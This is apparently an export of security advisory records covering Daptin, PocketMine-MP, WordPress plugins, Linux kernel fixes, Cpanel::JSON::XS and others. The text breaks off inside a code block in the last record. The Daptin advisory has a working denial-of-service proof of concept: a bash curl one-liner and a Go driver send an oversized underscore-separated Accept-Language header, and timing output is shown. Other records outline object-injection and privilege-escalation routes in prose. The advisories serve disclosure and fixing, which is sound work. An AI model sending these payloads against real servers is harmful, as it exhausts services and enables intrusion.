advisories.summary: Daptin: ParseAcceptLanguage `_` separator bypass enables >250x CPU amplification via Accept-Language header in LanguageMiddleware
advisories.description:
### Summary

Daptin's `LanguageMiddleware` (registered as a global gin middleware) calls `golang.org/x/text/language.ParseAcceptLanguage` on the raw `Accept-Language` header of every HTTP request without imposing any size or shape filter. The underlying parser has quadratic-time behaviour on long lists of malformed language tags. The CVE-2022-32149 guard that golang.org/x/text added in v0.3.8 caps the number of `-` characters in the input at 1000, but it does not cap `_` characters even though the parser's internal scanner aliases `_` to `-` before parsing. A single unauthenticated GET request with an `Accept-Language` header built out of `_` separators (only 256 KiB, not even the 1 MiB ceiling) consumes about 27 seconds of server CPU on the host running Daptin. A 1 MiB payload exceeds the 2-minute test client timeout. A single attacker on a 1 Mbit/s uplink can pin an entire Daptin host with one request every 30 seconds.

### Affected versions

`github.com/daptin/daptin` v0.12.15 and (per code inspection of `master`) all earlier 0.12.x versions that wire `LanguageMiddleware` on the global gin router without imposing their own size limit on `Accept-Language`. Verified on:

- the official release binary `daptin-linux-amd64` v0.12.15 built into a Docker image from the project's own `Dockerfile` (E2E below)
- `master` at commit `b021ac4ae1f72b7401e851fcf883bc970303c794` by reading `server/language.go` (the middleware is unchanged)

### Privilege required

Unauthenticated. The middleware is registered on the global gin router that serves both the public landing page and the unauthenticated `/api` style endpoints. Anyone who can reach the HTTP listener (port 8080 by default) is in scope.

### Vulnerable code

[`server/language.go`](https://github.com/daptin/daptin/blob/b021ac4ae1f72b7401e851fcf883bc970303c794/server/language.go) (blob SHA `b021ac4ae1f72b7401e851fcf883bc970303c794`):

```go
func (lm *LanguageMiddleware) LanguageMiddlewareFunc(c *gin.Context) {
    pref := GetLanguagePreference(c.GetHeader("Accept-Language"), lm.defaultLanguage)
    c.Request = c.Request.WithContext(context.WithValue(c.Request.Context(), "language_preference", pref))
}

func GetLanguagePreference(header string, defaultLanguage string) []string {
    preferredLanguage := header

    if preferredLanguage == "" || preferredLanguage == "undefined" || preferredLanguage == "null" {
        preferredLanguage = defaultLanguage
    }

    languageTags, _, err := language.ParseAcceptLanguage(preferredLanguage)
    resource.CheckErr(err, "Failed to parse Accept-Language header [%v]", preferredLanguage)
    pref := make([]string, 0)
    prefMap := make(map[string]bool)

    if len(languageTags) == 1 && languageTags[0].String() == defaultLanguage {
        // single tag matches default — skip
    } else {
        for _, tag := range languageTags {
            base, conf := tag.Base()
            if conf == 0 {
                continue
            }
            if prefMap[base.String()] == true {
                continue
            }
            prefMap[base.String()] = true
            pref = append(pref, base.String())
        }
    }
    return pref
}
```

`c.GetHeader("Accept-Language")` is the unfiltered HTTP header. Go's default `net/http` `MaxHeaderBytes` is `1 << 20` = 1 MiB and Daptin does not override it, so the parser is allowed to receive up to a megabyte of attacker-controlled data.

The `resource.CheckErr` call on the error path also formats the entire input string into a log line (`Failed to parse Accept-Language header [%v]`), amplifying the cost on attacker-supplied 256 KiB-1 MiB payloads.

CVE-2022-32149 hardened `ParseAcceptLanguage` by counting `-` characters and rejecting inputs with more than 1000 of them. The guard does not count `_` characters even though the scanner converts `_` to `-` at parse time ([`golang.org/x/text/internal/language/parse.go`](https://github.com/golang/text/blob/v0.28.0/internal/language/parse.go)). A 256 KiB header full of 9-character `_abcdefghi` tokens contains zero `-` characters, passes the guard, and then drives the scanner into the O(N²) `gobble` path.

### How `Accept-Language` reaches `ParseAcceptLanguage`

Every HTTP request that hits the Daptin API server passes through `LanguageMiddleware` (registered as a global gin middleware). The middleware sequence is:

1. The request enters `LanguageMiddlewareFunc`.
2. `c.GetHeader("Accept-Language")` returns the full attacker-supplied header value.
3. `GetLanguagePreference(header, defaultLanguage)` is called.
4. The function passes the unfiltered header into `language.ParseAcceptLanguage(preferredLanguage)`.

No size or character-class filter is applied between (2) and (4). The middleware runs for every gin handler — including the unauthenticated landing page at `/` and the public API root at `/api`.

### Proof of concept

Single-line bash reproducer that crafts the malicious header and times one request against a fresh Daptin container built from the project's own Dockerfile:

```bash
# Build daptin image (uses prebuilt linux/amd64 release binary)
cd daptin
curl -fL -O https://github.com/daptin/daptin/releases/download/v0.12.15/daptin-linux-amd64
chmod +x daptin-linux-amd64
docker build --platform linux/amd64 -t daptin-poc:v0.12.15 .

# Start it
docker run -d --platform linux/amd64 --name daptin --rm -p 18888:8080 daptin-poc:v0.12.15
sleep 8  # wait for sqlite migrations + Olric ring

# Attack with a 256 KiB header (smaller than the default 1 MiB ceiling
# because daptin's per-request cost saturates well below 1 MiB)
PAYLOAD="en$(python3 -c 'print("_abcdefghi" * 25600, end="")')"
echo "header size = ${#PAYLOAD} bytes"

curl -sS -o /dev/null \
  -w 'http=%{http_code} t=%{time_total}\n' \
  -H "Accept-Language: ${PAYLOAD}" \
  http://127.0.0.1:18888/
```

Each 9-character `_abcdefghi` token has length 9, which fails the scanner's `len <= 8` tag-length check at `golang.org/x/text/internal/language/parse.go` and triggers a `gobble` call that `runtime.memmove`s the entire remaining buffer. With N invalid tokens the total bytes moved by `gobble` is O(N²).

### End-to-end reproduction (against `daptin-linux-amd64` v0.12.15)

A Go driver `poc.go` boots the container, sends a 256 KiB `Accept-Language` value once with `-` (CVE-2022-32149 guard fires) and once with `_` (guard bypassed):

```go
// poc.go
package main

import (
    "fmt"
    "io"
    "net"
    "net/http"
    "strings"
    "time"
)

const targetURL = "http://127.0.0.1:18888/"

func buildPayload(sep string, targetBytes int) string {
    const tok = "abcdefghi"
    var b strings.Builder
    b.Grow(targetBytes + 16)
    b.WriteString("en")
    for b.Len()+1+len(tok) <= targetBytes {
        b.WriteString(sep)
        b.WriteString(tok)
    }
    return b.String()
}

func send(label, header string) {
    client := &http.Client{
        Timeout: 120 * time.Second,
        Transport: &http.Transport{
            DisableKeepAlives: true,
            DialContext: (&net.Dialer{Timeout: 5 * time.Second}).DialContext,
        },
    }
    req, _ := http.NewRequest("GET", targetURL, nil)
    if header != "" {
        req.Header.Set("Accept-Language", header)
    }
    t0 := time.Now()
    resp, err := client.Do(req)
    dt := time.Since(t0)
    if err != nil {
        fmt.Printf("  %-32s ERR after %v: %v\n", label, dt, err)
        return
    }
    _, _ = io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    fmt.Printf("  %-32s header=%d B  '_'=%d  '-'=%d  status=%d  t=%v\n",
        label, len(header),
        strings.Count(header, "_"), strings.Count(header, "-"),
        resp.StatusCode, dt)
}

func main() {
    send("warm-up", "")
    send("baseline (no header)", "")
    send("baseline (1 short tag)", "en-US")
    send("guard-fires ('-' x 256KiB)", buildPayload("-", 256*1024))
    send("attack ('_' x 256KiB)",     buildPayload("_", 256*1024))
    send("attack repeat 2",            buildPayload("_", 256*1024))
    send("attack repeat 3",            buildPayload("_", 256*1024))
}
```

Captured run output (Apple M1 Pro, darwin/arm64 host, daptin amd64 binary v0.12.15 running under Docker Desktop with QEMU x86_64 emulation):

```
E2E: golang/x/text ParseAcceptLanguage '_' bypass through
daptin/daptin v0.12.15 LanguageMiddleware at
server/language.go.

Target: http://127.0.0.1:18888/   payload=262144 B

  warm-up                                      header=0 B  '_'=0  '-'=0  status=200  t=19.968ms

--- measurements (single request each) ---
  baseline (no header)                         header=0 B  '_'=0  '-'=0  status=200  t=25.924208ms
  baseline (1 short tag)                       header=5 B  '_'=0  '-'=1  status=200  t=28.398333ms
  guard-fires control ('-' x 256KiB)           header=262142 B  '_'=0  '-'=26214  status=200  t=105.506458ms
  attack ('_' x 256KiB)                        header=262142 B  '_'=26214  '-'=0  status=200  t=26.679448875s
  attack repeat 2                              header=262142 B  '_'=26214  '-'=0  status=200  t=18.012964208s
  attack repeat 3                              header=262142 B  '_'=26214  '-'=0  status=200  t=8.868606042s
```

A separate run with a 1 MiB payload exceeded the 2-minute client timeout on the attack request, confirming that the cost scales beyond 120 s per request at 1 MiB.

Interpretation:

| Request                                  | Header bytes | Server time |
|------------------------------------------|--------------|-------------|
| no header / short tag                    | 0 - 5        | 26 - 28 ms  |
| 256 KiB `-` separators (CVE-2022-32149 guard fires) | 256 KiB | 106 ms      |
| 256 KiB `_` separators (guard bypassed)  | 256 KiB      | 9 - 27 s    |
| 1 MiB `_` separators (guard bypassed)    | 1 MiB        | > 120 s     |

The `-` control proves that the existing CVE-2022-32149 guard does still work on the canonical separator: a 256 KiB `-` payload returns in 106 ms because the parser short-circuits with `ErrTagListTooLarge`. The `_` attack returns 200 from the same endpoint but consumes 9-27 s of server CPU because the guard did not fire and the quadratic scanner ran to completion. The amplification factor at the application boundary is ~85-250x on the 256 KiB payload and >1000x on a 1 MiB payload.

The amplification is higher than other consumers of `ParseAcceptLanguage` because Daptin formats the entire input into a log line via `resource.CheckErr(err, "Failed to parse Accept-Language header [%v]", preferredLanguage)` when parsing fails, and runs additional bookkeeping in `GetLanguagePreference` (a `prefMap` deduplication loop over the resulting tag slice).

### Impact

- One unauthenticated client can pin one CPU core for ~9-27 seconds per 256 KiB request, or for at least 120 seconds per 1 MiB request.
- A single attacker on a 1 Mbit/s uplink can sustain ~1 attack request every 30 seconds, pinning one server core continuously with one TCP connection.
- A small number of concurrent attackers using ~10 MiB/s of upstream bandwidth pin a 10-core Daptin instance indefinitely.
- The endpoint returns 200 OK, so the attack does not surface as abnormal traffic in standard 4xx/5xx dashboards.

### Suggested fix

Apply the size / character-class filter inside `LanguageMiddleware` (and inside `GetLanguagePreference` for defence in depth) before reaching `language.ParseAcceptLanguage`. The smallest change that preserves the existing behaviour for legitimate Accept-Language headers is to count `_` alongside `-` and short-circuit when the total exceeds a small ceiling:

```go
// server/language.go
const maxAcceptLanguageSeparators = 32 // real browsers send < 10

func (lm *LanguageMiddleware) LanguageMiddlewareFunc(c *gin.Context) {
    header := c.GetHeader("Accept-Language")
    if strings.Count(header, "-")+strings.Count(header, "_") > maxAcceptLanguageSeparators {
        // Refuse to call into the BCP 47 parser with absurd input.
        header = ""
    }
    pref := GetLanguagePreference(header, lm.defaultLanguage)
    c.Request = c.Request.WithContext(context.WithValue(c.Request.Context(), "language_preference", pref))
}
```

A real Accept-Language header from a browser contains under 10 separators, so a ceiling of 32 leaves plenty of headroom while making the quadratic blow-up impossible.

The underlying issue is in `golang.org/x/text/language`. A future upstream fix is the right long-term solution; the change above is defensive-in-depth at the middleware that consumes attacker input.

### Credit

Reported by tonghuaroot.

### Fix PR

https://github.com/daptin/daptin-ghsa-rhj7-vh3v-mcq6/pull/1

### Maintainer fix status

Fixed on `master` in commit `2d709509 Harden Accept-Language parsing`.

The fix caps combined `-` and `_` separators in `Accept-Language` before calling `language.ParseAcceptLanguage`, both in `LanguageMiddlewareFunc` and in `GetLanguagePreference` for defence in depth. Regression coverage was added in `server/language_test.go` for normal browser headers, a 256 KiB underscore-separated malformed header, and combined separator counting.

Verification run:

```bash
go test ./server -count=1
```

Result: passed.

advisories.summary: PocketMine-MP has potential memory/network vulnerability from repeated ResourcePackClientResponsePacket packets
advisories.description:
### Summary
During the resource pack stage of logging in, after the server sends `ResourcePackStackPacket`, a malicious client can send a batch of multiple `ResourcePackClientResponsePacket` packets with status `ResourcePackClientResponsePacket::STATUS_COMPLETED` causing the server to repeatedly execute pre-spawn progression.

###  Impact
Multiple `Player` objects can be created for just a single session, increasing memory usage and amplifying outbound network traffic from duplication of large pre-spawn packets such as `AvailableCommandsPacket` and `CreativeContentPacket`.

### Workarounds
Plugins can use their own `PacketHandler` classes that reject/ignore any extra `ResourcePackClientResponsePacket` packets.

### Patches
This issue was patched in https://github.com/pmmp/PocketMine-MP/commit/7a27894146a04964ab628ed9033140fdbf887ff3 and released in 5.44.2.

advisories.description: The Gravity Forms plugin for WordPress is vulnerable to PHP Object Injection in all versions up to, and including, 3.1.2 via a Post Custom Field whose input type is List. This is due to GFFormsModel::create_post() passing the submitted value to WordPress' unrestricted global maybe_unserialize() rather than the plugin's own hardened GFCommon::maybe_unserialize(), which was added in 3.1.1 and passes allowed_classes => false precisely to prevent object instantiation. Where the field has a content template enabled, the submitted row reaches that call verbatim. This makes it possible for unauthenticated attackers to inject a PHP object into post meta. No PHP Object Injection gadget chain is present in the plugin itself; however, if a gadget chain is present via an additional plugin or theme, it could allow the attacker to perform actions such as remote code execution. Where the custom field is mapped to the protected _wp_page_template meta key, WordPress itself supplies the chain: validate_file() accepts non-scalars, WP_Theme::__toString() then resolves an attacker-controlled path, and on hosts with a readable PEAR install and register_argc_argv enabled this yields remote code execution.

advisories.description: The Page and Post Restriction plugin for WordPress is vulnerable to Authentication Bypass in all versions up to, and including, 1.6.1 This is due to the `papr_restrict_page_post_rest_api()` function, hooked on `rest_pre_dispatch`, re-authenticating the current user from the `wordpress_logged_in` cookie via `wp_set_current_user()` for any GET or HEAD REST request where the current user is 0, without verifying a REST nonce — silently undoing the nonce-zeroing that WordPress core's `rest_cookie_check_errors()` performs on cookie-authenticated requests that lack an `X-WP-Nonce` header or `_wpnonce` parameter. advisories.summary: The Enable Media Replace WordPress plugin before 4.2.3 does not restrict the classes allowed when...
advisories.description:
The Enable Media Replace WordPress plugin before 4.2.3 does not restrict the classes allowed when deserializing stored metadata during its media replace-and-update-links routine, allowing unauthenticated users to inject a PHP object that is instantiated when a user with upload access performs a routine media replacement, resulting in PHP Object Injection and local file inclusion of existing PHP/HTML files, which can be escalated to remote code execution where an attacker-influenced PHP or HTML file is present on the server.

advisories.summary: A flaw was found in glib-networking. When establishing connections using Transport Layer Security...
advisories.description: A flaw was found in glib-networking. When establishing connections using Transport Layer Security (TLS) version 1.3, the client-side session cache does not limit the number of session tickets retained for a single host. A malicious server can exploit this by sending excessive session ticket messages, causing the client application to continuously consume memory. This unbounded memory growth can exhaust system memory, resulting in a Denial of Service (DoS).

advisories.summary: The Export and Import Users and Customers plugin for WordPress is vulnerable to Privilege...
advisories.description: The Export and Import Users and Customers plugin for WordPress is vulnerable to Privilege Escalation in all versions up to, and including, 2.7.5 via the plugin's own export and re-import workflow. The vulnerability exists because of a CSV escape-character mismatch between the exporter and the importer: class-csvwriter.php writes cells with fputcsv() using PHP's default backslash (\) escape character, while class-csvreader.php parses the same file with fgetcsv() using a double-quote (") as the escape character. As a result, a crafted value stored in a Subscriber's Biographical Info field — containing a backslash-quote sequence followed by a newline — is written as a single quoted CSV field but parsed back as two separate rows on import. The injected second row is then processed by hf_create_customer() as a new user record whose user_login, user_pass, user_email, and role are entirely attacker-controlled, allowing the creation of an arbitrary Administrator account. This makes it possible for authenticated attackers with Subscriber-level access and above to escalate their privileges to Administrator.

advisories.description:
A web page that contains unusual GPU shader code is loaded into the GPU compiler process and can lead memory allocation failure. If the allocation failure is not properly handled, the compiler may dereference a NULL pointer at a controlled offset, resulting in a crash of the compiler process. advisories.summary:
In the Linux kernel, the following vulnerability has been resolved:

ipv4: free inet_opt and...
advisories.description:
In the Linux kernel, the following vulnerability has been resolved:

ipv4: free inet_opt and ireq_opt after an RCU grace period

tcp_v4_syn_recv_sock() transfers ownership of ireq->ireq_opt to the
child socket (newinet->inet_opt) without copying it.

Another cpu can concurrently process a retransmitted SYN for the same
request socket, and send a SYNACK from tcp_check_req().
tcp_v4_send_synack() and inet_csk_route_req() read ireq->ireq_opt
under rcu_read_lock() only, and ip_build_and_send_pkt() and
ip_options_build() then read opt->optlen twice.

Note that the SYNACK timer itself is not an issue: it holds a
reference on its request socket, and inet_csk_reqsk_queue_drop()
calls timer_delete_sync() before the child can be freed.

Since commit 079096f103fa ("tcp/dccp: install syn_recv requests
into ehash table"), request sockets are processed without holding
the listener lock, so nothing prevents the child socket from being
freed while the SYNACK is still being built. TCP child sockets do
not have SOCK_RCU_FREE, and inet_sock_destruct() frees inet_opt
with a plain kfree(), leading to a use-after-free in
ip_options_build().

A similar issue exists with request socket migration
(net.ipv4.tcp_migrate_req=1, or a BPF_SK_REUSEPORT_SELECT_OR_MIGRATE
program). reqsk_timer_handler() clones the request socket with
inet_reqsk_clone(), so that the old request socket and its clone
share the same ireq_opt, then reqsk_migrate_reset() clears the
pointer in the old one. Another cpu holding a reference on the old
request socket can still be using these options (sending a SYNACK,
or creating a child in tcp_v4_syn_recv_sock()) when the clone is
freed, and tcp_v4_reqsk_destructor() also uses a plain kfree().

Readers already use RCU, and other paths replacing inet_opt
(do_ip_setsockopt(), cipso_v4_sock_setattr()...) already use
kfree_rcu(). Use kfree_rcu() in inet_sock_destruct() and
tcp_v4_reqsk_destructor() as well.

IPv6 is not affected by the first issue, because tcp_v6_syn_recv_sock()
duplicates the options. tcp_v6_reqsk_destructor() has the same
migration issue with ipv6_opt, which is only set by CALIPSO. This
will be addressed in a separate patch.

The system certificate authority (CA) store in Red Hat products, distributed via ca-certificates RPM packages, included multiple root CA certificates of authorities, which signed intermediate CA certificates with weak private keys issued by the eMudhra certificate authority. A man-in-the-middle attacker could use this flaw to issue certificates for arbitrary host names signed by the weak intermediate CA certificates, which would be considered trusted by a TLS/SSL client using system CA store and cause such clients to connect to malicious sites.

Due to inability to only distrust specific intermediate certificates in all clients using the system CA store, root CA certificates of authorities that signed weak intermediate CA certificates are being removed.

advisories.summary: Pass-through of unvalidated KMS URLs to KMS clients in Apache C++ Parquet and PyArrow versions 4...
advisories.description:
Pass-through of unvalidated KMS URLs to KMS clients in Apache C++ Parquet and PyArrow versions 4.0.0 to 25.0.1.




This affects users who read Parquet files and configure Parquet decryption properties with a KmsClient implementation.




On the reader side, the KMS URL can be application-controlled (specified in the KmsConnectionConfig) or file-controlled.
If the user does not leverage application control for this parameter, a file-controlled KMS URL is forwarded to a pluggable KmsClient implementation. 
If the KMS implementation does not perform host validation and makes use of the provided KMS URL, a KMS token can be sent to a malicious host set by an attacker in the file. 




Users are recommended to upgrade to version 26.0.0, which disables this behavior by default and requires that users opt-in to it by enabling the read_kms_url flag in the DecryptionConfiguration. Users of affected versions are recommended to either specify the KMS URL in the KmsConnectionConfig when reading files, or ensure any KmsClient implementations validate received KMS URLs. Users that opt-in to file-controlled KMS URLs in version 26.0.0 and later must ensure KmsClients validate KMS URLs.

advisories.summary:
In the Linux kernel, the following vulnerability has been resolved:

scsi: scsi_transport_fc:...
advisories.description:
In the Linux kernel, the following vulnerability has been resolved:

scsi: scsi_transport_fc: Widen FPIN pname walker counter to u32

An adjacent Fibre Channel fabric actor that can deliver an FPIN ELS
frame to an lpfc or qla2xxx Linux initiator can trigger a non-return in
the generic FC transport. This is not a local userspace or IP network
path; the attacker must be able to inject fabric traffic, for example as
a compromised switch or fabric controller, or as a same-zone N_Port on a
fabric that permits source spoofing.

The Link-Integrity and Peer-Congestion FPIN walkers used a u8 loop
counter against the 32-bit on-wire pname_count field, and did not bound
pname_count by the descriptor body already validated by the TLV walker.
A pname_count of 256 therefore wraps the counter and keeps the loop
condition true indefinitely.

Factor the shared pname_list[] walk into one helper, widen the counter
to u32, and clamp pname_count against the entries that fit in the
descriptor body before iterating.

advisories.summary: Cpanel::JSON::XS versions before 4.80 for Perl allow memory exhaustion by buffering incremental...
advisories.description:
Cpanel::JSON::XS versions before 4.80 for Perl allow memory exhaustion by buffering incremental input past max_size in incr_parse.

The parser appends each chunk to its buffer. In scalar or list context, it compares max_size with how far it has progressed, not with the buffer length. A chunk that starts with a NUL byte stops the parser before it progresses, and a call in void context skips the check, so the buffer grows without limit.

A peer streaming data to an incr_parse consumer can exhaust process memory regardless of max_size.

cwes.name: Allocation of Resources Without Limits or Throttling

advisories.summary: Apache Airflow Amazon provider: the AWS auth manager's SAML login flow does not bind the...
advisories.description:
Apache Airflow Amazon provider: the AWS auth manager's SAML login flow does not bind the authentication response to the browser that began it. The login handler discards the AuthnRequest ID and the callback validates the assertion without requiring a matching InResponseTo, so an unauthenticated attacker who can cause a victim to load a page can complete a SAML login in the victim's browser using the attacker's own assertion, silently logging the victim into the attacker's Airflow account. Subsequent work the victim performs lands in a session the attacker controls.

Affects deployments using the AWS auth manager with SAML authentication. The victim needs only to visit an attacker-controlled page; no Airflow account or credential is required of the attacker. This is the same login-CSRF class fixed in the Keycloak auth manager as CVE-2026-40948.

Users of apache-airflow-providers-amazon are recommended to upgrade to version 9.38.0, which fixes the issue.

advisories.summary: Cpanel::JSON::XS versions from 4.43 before 4.80 for Perl misorder byte-string keys during...
advisories.description:
Cpanel::JSON::XS versions from 4.43 before 4.80 for Perl misorder byte-string keys during canonical encoding in utf16_cmp.

canonical sorts keys by UTF-16 code units. When any key in a hash is UTF-8 flagged, every key is decoded as UTF-8 for the comparison, including byte-string keys that the encoder writes out as Latin-1 characters. A byte-string key whose bytes are valid UTF-8 is sorted out of order, and two keys that encode differently can compare equal and are left in hash order.

The same data can encode to different canonical documents across processes.

advisories.summary: Cpanel::JSON::XS versions before 4.80 for Perl use freed filter callbacks when a filter removes...
advisories.description:
Cpanel::JSON::XS versions before 4.80 for Perl use freed filter callbacks when a filter removes itself during decoding in decode_hv.

A decode copies the parser's filter_json_object and filter_json_single_key_object callbacks without taking references to them. A filter callback that removes the last single-key filter frees the callback table while the decode in progress still uses it. The next object is dispatched through freed memory and can crash the process.

advisories.summary: Cpanel::JSON::XS versions before 4.80 for Perl leak the decoded arguments of a tagged value when...
advisories.description:
Cpanel::JSON::XS versions before 4.80 for Perl leak the decoded arguments of a tagged value when its THAW method dies in decode_tag.

With allow_tags, a tagged value's class name and argument array are decoded and passed to the class's THAW method. Both are released only after THAW returns, so a THAW that dies leaves the whole decoded argument structure allocated.

Each rejected document leaks data of a size the sender chooses, so a process that catches the error and keeps running exhausts its memory.

cwes.name: Missing Release of Memory after Effective Lifetime

advisories.summary: Cpanel::JSON::XS versions before 4.80 for Perl allow memory exhaustion by encoding exponent...
advisories.description:
Cpanel::JSON::XS versions before 4.80 for Perl allow memory exhaustion by encoding exponent notation as full decimal digits under allow_bignum.

With allow_bignum, a JSON number with a fraction or exponent decodes to a Math::BigFloat, which stores the exponent separately and so decodes cheaply. Encoding it untyped or as JSON_TYPE_FLOAT writes the plain decimal form with one digit per unit of exponent. Nothing bounds the exponent, so the 12-byte text [1e30000000] encodes to 30 MB.

Untrusted JSON decoded with allow_bignum and encoded again can exhaust memory and CPU.

advisories.summary: Cpanel::JSON::XS versions before 4.80 for Perl allow stack exhaustion via nested tagged values...
advisories.description:
Cpanel::JSON::XS versions before 4.80 for Perl allow stack exhaustion via nested tagged values under allow_tags in decode_tag.

With allow_tags, "(" starts a tagged value. Its tag and value are decoded recursively, and each can start another tagged value. Unlike arrays and objects, this nesting is not counted against max_depth.

A run of "(" bytes exhausts the C stack and triggers an uncatchable segmentation fault regardless of max_depth.

advisories.summary: Cpanel::JSON::XS versions from 4.33 before 4.80 for Perl miss duplicate non-ASCII bare keys,...
advisories.description:
Cpanel::JSON::XS versions from 4.33 before 4.80 for Perl miss duplicate non-ASCII bare keys, allowing type confusion under dupkeys_as_arrayref in decode_hv.

With allow_barekey, which relaxed enables, a bare key containing a non-ASCII byte is stored as UTF-8 but looked up as raw bytes, so a repeated key escapes the duplicate-key check and replaces the earlier value.

From 4.41, under dupkeys_as_arrayref, a bare repeat replaces the array that collects a key's values with a plain value, and the next quoted repeat pushes onto that value as if it were an array. A JSON integer there is dereferenced as a pointer.

Untrusted JSON decoded with relaxed and dupkeys_as_arrayref can crash the process or dereference an address chosen by a JSON number.

advisories.summary: Cpanel::JSON::XS versions from 4.51 before 4.80 for Perl allow quadratic CPU use by revalidating...
advisories.description:
Cpanel::JSON::XS versions from 4.51 before 4.80 for Perl allow quadratic CPU use by revalidating the remaining buffer per value in incr_parse.

At the first non-ASCII byte in a string, the decoder validates UTF-8 from there to the end of its input. incr_parse decodes each buffered value with a fresh decoder, so every value revalidates the rest of the buffer, and doubling the input quadruples the work.

A peer that sends about a megabyte of ordinary non-ASCII JSON in one read ties up the process for seconds of CPU time.

advisories.summary: Cpanel::JSON::XS versions from 4.42 before 4.80 for Perl let input chunking change the decoded...
advisories.description:
Cpanel::JSON::XS versions from 4.42 before 4.80 for Perl let input chunking change the decoded value of top-level numbers in incr_parse.

allow_nonref is enabled by default and incr_parse inherits it. A top-level number, true, false or null has no closing delimiter, so the incremental parser decodes whatever has arrived. The bytes 12 decode as one value when read together, but as 1 and then 2 when split across two reads.

A peer that can influence read boundaries can change how many messages a stream consumer decodes and what values they carry.

advisories.summary: Initialization of a resource with an insecure default vulnerability in OpenText Advanced...
advisories.description:
Initialization of a resource with an insecure default vulnerability in OpenText Advanced Authentication Server allows Excessive Allocation.

This issue affects Advanced Authentication Server: from 6.4.0.0 through 6.4.3.x, from 6.5.0.0 through 6.5.0.x, and from 6.6.0.0 through 6.6.1.0.



The fix for this is issue is to create a secure configuration.  The 6.6.2.0 release has a best practice entry if the configuration is unsecure.



A secure configuration is to NOT allow creation/recreation of Unauthenticated Endpoints.  If creation/recreation of Unauthenticated Endpoints is required, you should only allow it from trusted networks.  



To remedy this issue, change your configuration to NOT allow creation/recreation of Unauthenticated Endpoints. If you require Unauthenticated Endpoints, you MUST change your configuration to use a non-empty whitelist to specify the trusted networks.  An empty whitelist will allow all networks to create/recreate endpoints.

cwes.name: Initialization of a Resource with an Insecure Default

advisories.summary: P-Net before 1.0.3 contains an integer underflow in pf_cpm_c_data_ind(). When handling a received...
advisories.description: P-Net before 1.0.3 contains an integer underflow in pf_cpm_c_data_ind(). When handling a received cyclic data frame while the consumer is in the FRUN or RUN state, the offset of the APDU status was computed as the frame length minus 4 using 16-bit arithmetic, without checking that the frame is long enough. advisories.summary: P-Net before 1.0.3, when built with PNET_OPTION_AR_VENDOR_BLOCKS enabled, parses a data length...

This option is disabled by default.

advisories.summary: P-Net before 1.0.3 does not validate the length of a received Ethernet frame in pf_eth_recv()...

This can cause a crash (denial of service) or disclose memory content.

advisories.summary: Cpanel::JSON::XS versions from 3.0202 before 4.80 for Perl leak memory and retain overloaded...
advisories.description:
Cpanel::JSON::XS versions from 3.0202 before 4.80 for Perl leak memory and retain overloaded objects when encoding values as strings in encode_stringify.

encode_stringify writes a value in its string form under allow_stringify, under convert_blessed for objects without TO_JSON, and under allow_bignum. For an array or hash object with a "" overload, and from 4.20 a scalar object, it takes an extra reference that is never released, so the object and everything it references are never freed. From 4.10 it also never frees its copy of the string.

Repeatedly encoding data that contains such values grows process memory without bound.

cwes.name: Missing Release of Memory after Effective Lifetime

advisories.summary: Cpanel::JSON::XS versions from 4.33 before 4.80 for Perl accept malformed UTF-8 in bare hash keys...
advisories.description:
Cpanel::JSON::XS versions from 4.33 before 4.80 for Perl accept malformed UTF-8 in bare hash keys under allow_barekey in decode_hv.

With utf8 and allow_barekey, which relaxed enables, a quoted key is validated as UTF-8 but a bare key's bytes are stored as a UTF-8 flagged string without any check. Malformed UTF-8, control bytes and backslashes reach the decoded hash, while malformed UTF-8 and control bytes in a quoted key or a value are rejected.

Later operations on the key, including lc, uc or encoding the hash again, die with a malformed UTF-8 error.

cwes.name: Improper Validation of Syntactic Correctness of Input

advisories.summary: Cpanel::JSON::XS versions before 4.80 for Perl leak the decoded key of an object rejected for a...
advisories.description:
Cpanel::JSON::XS versions before 4.80 for Perl leak the decoded key of an object rejected for a duplicate key or a missing colon in decode_hv.

A quoted key of 24 or more bytes, or one containing a non-ASCII byte or an escape sequence, is decoded into a new scalar. Nothing frees that scalar when the object is rejected for a missing ':' after the key or, from 4.09, for a duplicate key. Duplicate keys are an error unless allow_dupkeys, dupkeys_as_arrayref or relaxed is set.

A process that keeps running after a failed decode retains one key per rejected document, with its size chosen by the sender. Repeated requests exhaust process memory.

cwes.name: Missing Release of Memory after Effective Lifetime

advisories.description:
Cpanel::JSON::XS versions from 4.28 before 4.80 for Perl leak the array collecting duplicate key values under dupkeys_as_arrayref in decode_hv.

With dupkeys_as_arrayref, the values of a duplicate object key are collected into a new array. An extra reference is never released, so the array and every value in it outlive the decoded structure. The array also leaks when decoding fails after a duplicate key.

Repeatedly decoding untrusted JSON with a duplicate key holding a large value exhausts process memory.

cwes.name: Missing Release of Memory after Effective Lifetime

advisories.summary:
The insights-runtime-extractor runs as a privileged DaemonSet (`hostPID: true`)
that scans...
advisories.description:
The insights-runtime-extractor runs as a privileged DaemonSet (`hostPID: true`)
that scans container processes for runtime fingerprinting. When scanning a
container, the coordinator:

1. **fork()s** a child process
2. **setns()** into the target container's PID and mount namespaces
3. **fchdir()** back to an orphaned FD pointing at the extractor's own root
   filesystem (where `/crio.sock` is hostPath-mounted)
4. Calls **only `seteuid(target_uid)`** — changing the effective UID but leaving
   the **real UID and saved-set-UID at 0** and **retaining the permitted
   capability set**
5. The `check_no_privileged_perms()` guard inspects only the Effective capability
   set (so it passes), and is **skipped entirely when the target runs as uid 0**
6. The `VersionExecutable` fingerprint invokes `fpr_kind_executable` with
   `process.command_line[0]` — the target's argv[0], read from
   `/proc/<pid>/cmdline` and **fully controlled by the workload**
7. `fpr_kind_executable` calls `exec.Command(executable, "--version").Output()`
   — executing the **workload's own binary** inside the workload's mount
   namespace while **ruid=0 in the host user namespace**

The executed process can call `setuid(0)` to restore full root with
`CAP_SYS_ADMIN`, and inherits the orphaned cwd which resolves into the extractor
container's filesystem containing the host CRI-O socket.

## Affected Code

### 1. Insufficient privilege drop (Rust — extractor coordinator)

**File:** `extractor/src/insights_runtime_extractor.rs`

```rust
// Lines 139-146 — seteuid-only drop, guard skipped for root containers
join_process_namespaces(process.pid)?;
change_dir(current_dir);
switch_user(*process.uid)?;
if *process.uid != 0 {
    perms::check_no_privileged_perms()
        .expect("Must not have privileged permissions to run fingerprints");
}
fingerprint::run_fingerprints(&config, out_dir, &process);
```

```rust
// Lines 182-185 — only effective UID changed; ruid/suid stay 0
fn switch_user(uid: u32) -> Result<(), ScannerError> {
    debug!("... Becoming user: {uid}");
    seteuid(uid.into()).map_err(|e| ScannerError::Errno(e))
}
```

### 2. Execution of untrusted binary (Go — fingerprint)

**File:** `fingerprints/pkg/utils/file.go`

```go
